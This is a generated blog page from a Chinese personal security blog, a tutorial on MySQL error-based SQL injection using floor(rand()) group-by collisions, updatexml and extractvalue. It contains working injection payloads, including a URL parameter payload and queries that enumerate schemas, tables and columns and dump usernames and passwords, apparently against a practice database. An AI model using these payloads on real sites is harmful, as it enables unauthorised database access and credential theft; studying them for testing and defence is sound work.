@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="报错注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="报错注入">
+<meta property="og:url" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="xf&#39;s blog">
+<meta property="og:description" content="报错注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813111125453.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813112216452.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813112454121.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813151427299.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813172331166.png">
+<meta property="og:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813172302723.png">
+<meta property="article:published_time" content="2021-09-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-19T13:47:03.526Z">
+<meta property="article:author" content="xf">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813111125453.png">
+
+
+<link rel="canonical" href="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","path":"2021/09/19/web安全/SQL注入篇/报错注入/","title":"报错注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>报错注入 | xf's blog</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?50383950ce261bfae047ef555de05e48"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">xf's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1%EF%BC%89floor"><span class="nav-number">1.</span> <span class="nav-text">1）floor</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">1.原理解析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">2.基本使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">3.案例分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2%EF%BC%89updatexml"><span class="nav-number">2.</span> <span class="nav-text">2）updatexml</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3%EF%BC%89extractvalue"><span class="nav-number">3.</span> <span class="nav-text">3）extractvalue</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xf"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">xf</p>
+  <div class="site-description" itemprop="description">xf@github.io</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="xf">
+      <meta itemprop="description" content="xf@github.io">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xf's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          报错注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-09-19 00:00:00 / 修改时间：21:47:03" itemprop="dateCreated datePublished" datetime="2021-09-19T00:00:00+08:00">2021-09-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>报错注入</p>
+<span id="more"></span>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">floor			</span><br><span class="line">updatexml		<span class="comment">--	显示数据最长32位</span></span><br><span class="line">extractvalue 	<span class="comment">--	显示数据最长32位</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="1）floor"><a href="#1）floor" class="headerlink" title="1）floor"></a>1）floor</h1><h2 id="1-原理解析"><a href="#1-原理解析" class="headerlink" title="1.原理解析"></a>1.原理解析</h2><p>可以先看后面2个简单的</p>
+<p>首先创建测试数据表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> floor_test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> floor_test(</span><br><span class="line">	id 		<span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">	name 	<span class="type">varchar</span>(<span class="number">50</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">--需要使用到</span></span><br><span class="line">	floor 	向下取整</span><br><span class="line">	rand(x)	取随机小数，x为种子 设定一个值后获取都是相同的，如果连续获取就不唯一</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--重复执行一下语句</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> floor_test <span class="keyword">value</span>(<span class="keyword">null</span>,concat(<span class="string">&#x27;test&#x27;</span>,RAND()));	<span class="comment">--插入信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">as</span> f <span class="keyword">from</span> floor_test <span class="keyword">group</span> <span class="keyword">by</span> f;	<span class="comment">-- 问题语句</span></span><br><span class="line"><span class="comment">--首先要知道floor(rand(0)*2)的值 只有0和1</span></span><br></pre></td></tr></table></figure>
+
+<p>因为<code>rand(0)</code>的值浮动小，所以可以预测</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813111125453.png" class="">
+
+<p>推断出<code>floor(rand(0)*2) </code>的值是按照<code>011011...</code>的顺序</p>
+<p>此时就来看 <code>select count(*),floor(rand(0)*2) as f from floor_test group by f;</code>语句的问题</p>
+<p>首先它会创建一个虚拟表，存储结果。第一次执行，获取到<code>group by </code>后面的f的值-这里称为gf，也就是gf=0，此时会去找虚拟表中是否有这个键存在（因为是分组，它肯定要保证键唯一 代表在同一个组里），这个是否发现不存在，那么就可以插入了，此时获取需要插入的值，第一个<code>count(*)</code>-后面称为c，数量第一次插入肯定为1，然后获取<code>floor(rand(0)*2)</code>-后面称为f，此时f的值为1，然后就插入到虚拟表中。</p>
+<p><strong>此时结果</strong>：（为什么键为1呢，因为gf的值是根据f来的，f变了gf也变了）</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813112216452.png" class="">
+
+<p>第二次获取，此时gf的值为1，然后去虚拟表找键，发现有对应的键，那么就将数量的值+1</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813112454121.png" class="">
+
+<p>然后第三次获取，这个时候键为0，再去找虚拟表，这个时候发现没有相同的键，那么可以增加进去，然后获取到f的值为1，此时再进行插入，<strong>键为1（注意f的值变了）</strong>，这个时候就会出现问题了，键是不能重复的，所以报错了。</p>
+<p>注意点：</p>
+<ul>
+<li><code>rand(0)</code>的值可控，换成其他值这个就不成立了</li>
+<li>from表的行数必须得大于等于3才行，否则不会报错</li>
+</ul>
+<h2 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2.基本使用"></a>2.基本使用</h2><p>根据报错操作，我们再拼接上我们需要的信息即可，表的数据量不够，我们可以选用<code>information_schema.tables</code>这个表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--首先，我们需要构造出报错的显示信息</span></span><br><span class="line">concat(version(),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>) <span class="operator">*</span> <span class="number">2</span>)) <span class="comment">--前面不变，变得floor...的值 所以还是会出现重复键的情况 0x7e : ~</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>) <span class="operator">*</span> <span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x <span class="comment">--保证了我们想要的数据，以及表的数据大于3条</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--因为这里有多列数据，而我们使用and拼接 后面的数据必须为1列 所以在前面控制列数</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="comment">--即  并且查出来的表必须给一个别名</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>) <span class="operator">*</span> <span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-案例分析"><a href="#3-案例分析" class="headerlink" title="3.案例分析"></a>3.案例分析</h2><p>报错盲注显示版本：</p>
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813151427299.png" class="">
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获取版本、数据库名，用户名、系统基本类似：</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>) <span class="operator">*</span> <span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>爆库</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获取所有库的数量</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(schema_name) <span class="keyword">FROM</span> information_schema.schemata</span><br><span class="line"></span><br><span class="line"><span class="comment">--获取所有库名</span></span><br><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">FROM</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--将其填充到 version()的位置并加个()</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>爆表</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获取指定数据库的表数量</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--获取指定数据库的表名</span></span><br><span class="line"><span class="keyword">SELECT</span> concat(<span class="number">0x7e</span>,table_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span> LIMIT <span class="number">0</span>,<span class="number">1</span> <span class="comment">--数据库名转换成了16进制 防止过滤，每次获取一个</span></span><br><span class="line"><span class="comment">--通过修改limit的值达到获取所有表名</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>爆字段</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获取指定数据库的指定表的字段总数</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns </span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--获取指定数据库的指定表的字段</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> information_schema.columns </span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span></span><br><span class="line">limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>爆值</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获取对应数据库数据表的数据量</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> security.users</span><br><span class="line"></span><br><span class="line"><span class="comment">--获取数据</span></span><br><span class="line"><span class="keyword">select</span> concat(username,<span class="number">0x3a</span>,password) <span class="keyword">from</span> security.users</span><br><span class="line">limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="2）updatexml"><a href="#2）updatexml" class="headerlink" title="2）updatexml"></a>2）updatexml</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">updataxml()函数用法</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">UPDATEXML (XML_document, XPath_string, new_value);</span></span><br><span class="line"><span class="comment">第一个参数：XML_document是String格式，为XML文档对象的名称</span></span><br><span class="line"><span class="comment">第二个参数：XPath_string (Xpath格式的字符串)</span></span><br><span class="line"><span class="comment">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span></span><br><span class="line"><span class="comment">作用：改变文档中符合条件的节点</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">一般都是第一和第三都是随便写 </span></span><br><span class="line"><span class="comment">第二个写显示的值</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">因为里面的内容不属于xpath内容 所以会报错</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">获取当前数据库的名字~xxx~</span></span><br><span class="line"><span class="comment">select updatexml(0,concat(0x7e,database(),0x7e),0)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取数据库表个数</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and </span></span><br><span class="line"><span class="string">updatexml(0,concat(0x7e,(</span></span><br><span class="line"><span class="string">select count(table_name) from information_schema.tables where table_schema=database()</span></span><br><span class="line"><span class="string">),0x7e),0) </span></span><br><span class="line"><span class="string">--+</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813172331166.png" class="">
+
+<p><strong>其他类似</strong></p>
+<h1 id="3）extractvalue"><a href="#3）extractvalue" class="headerlink" title="3）extractvalue"></a>3）extractvalue</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ExtractValue(xml_frag, xpath_expr)</span></span><br><span class="line"><span class="comment">	一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">例如：SELECT ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;, &#x27;/a/b&#x27;); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取数据库</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--第一个数据随便写，第二个测试使用~开头一定报错</span></span><br><span class="line"><span class="keyword">SELECT</span> ExtractValue(<span class="string">&#x27;1&#x27;</span>, concat(<span class="string">&#x27;~&#x27;</span>,database()));</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20210813172302723.png" class="">
+
+<p><strong>其他类似</strong></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" rel="prev" title="宽字节注入">
+                  <i class="fa fa-chevron-left"></i> 宽字节注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/09/19/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/mysql%E5%BB%B6%E8%BF%9F%E6%B3%A8%E5%85%A5/" rel="next" title="mysql延迟注入">
+                  mysql延迟注入 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xf</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
